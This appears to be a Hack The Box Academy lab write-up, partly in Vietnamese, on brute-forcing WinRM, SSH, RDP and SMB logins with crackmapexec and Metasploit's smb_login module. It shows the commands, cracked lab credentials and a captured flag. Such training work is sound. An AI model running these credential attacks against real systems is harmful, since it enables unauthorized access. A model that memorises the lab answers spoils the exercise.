# Network Services
+ 0  Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```zsh
❯ crackmapexec winrm 10.129.105.153 -u username.list
```

`john:november`

![](images/1.png)

![](images/2.png)

+ 0  Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
![](images/3.png)

`dennis:rockstar`

+ 0  Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```powershell
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

dennis@WINSRV C:\Users\dennis>cd Desktop 

dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt 
HTB{Let5R0ck1t}                        
dennis@WINSRV C:\Users\dennis\Desktop> 
```

+ 0  Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

![](images/4.png)

`john:november`

Trông có vẻ dễ ăn cho tới khi không vào được (permission denied), chuyển hướng sang enum cả list với metasploit:

```zsh
msf6 auxiliary(scanner/smb/smb_login) > set user_file /home/kali/Desktop/learning/password_attack/username.list
user_file => /home/kali/Desktop/learning/password_attack/username.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file /home/kali/Desktop/learning/password_attack/password.list
pass_file => /home/kali/Desktop/learning/password_attack/password.list
msf6 auxiliary(scanner/smb/smb_login) > run
```


```zsh
[+] 10.129.105.153:445    - 10.129.105.153:445 - Success: '.\john:november'
[+] 10.129.105.153:445    - 10.129.105.153:445 - Success: '.\dennis:rockstar'
[+] 10.129.105.153:445    - 10.129.105.153:445 - Success: '.\chris:789456123'
[+] 10.129.105.153:445    - 10.129.105.153:445 - Success: '.\cassie:12345678910'
```

Check `shares` thì có `CASSIE` -> Ưu tiên cassie:12345678910

![](images/5.png)